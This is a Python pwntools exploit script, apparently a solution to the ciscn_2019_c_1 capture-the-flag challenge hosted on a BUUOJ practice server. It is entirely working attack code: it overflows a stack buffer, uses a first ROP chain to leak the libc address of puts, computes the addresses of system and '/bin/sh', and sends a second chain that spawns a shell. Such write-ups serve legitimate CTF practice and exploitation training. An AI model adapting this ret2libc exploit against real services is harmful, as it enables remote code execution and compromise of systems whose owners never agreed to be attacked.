#!/usr/bin/python
#__author__:TaQini

from pwn import *
context.log_level = 'debug'
DEBUG = False # True

elf = ELF('./ciscn_2019_c_1')
if DEBUG:
	p = process('./ciscn_2019_c_1')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else: 
	p = remote('node3.buuoj.cn',28863)
	libc = ELF('.../libc.so.6')

len = 88

puts_got = elf.got['puts'] #^ 0x0d0d0d0d
puts = elf.symbols['puts'] #^ 0x0d0d0d0d
main = elf.symbols['main'] #^ 0x0d0d0d0d

prdi = 0x0000000000400c83 # pop rdi ; ret
log.info('puts got = ' + hex(puts_got))
log.info('puts = ' + hex(puts))

# rop1
payload = 'O'*len
payload += p64(prdi) + p64(puts_got) + p64(puts) + p64(main)

p.recvuntil('Input your choice!\n')

p.sendline('1')
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload)

p.recvuntil('Ciphertext\n')
data = p.recvuntil('EEEEEEE')
puts_libc = data.split('\nEEEEEEE')[0][-6:].ljust(8,'\0')
puts_libc = u64(puts_libc)
log.info('puts_libc = ' + hex(puts_libc))

offset = puts_libc - libc.symbols['puts']

system = offset + libc.symbols['system']
binsh = offset + libc.search('/bin/sh').next()
log.info('system_libc = ' + hex(system))
log.info('binsh_libc = ' + hex(binsh))

ppr = 0x0000000000400c81 # pop rsi ; pop r15 ; ret
# rop2
payload2 = '\0'*len
payload2 += p64(ppr) + p64(0xdeadbeef)*2 
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)

p.recvuntil('Input your choice!\n')
p.sendline('1')
p.recvuntil('Input your Plaintext to be encrypted\n')
if DEBUG:
	gdb.attach(p,'b *0x400ad1')
p.sendline(payload2)

p.interactive()
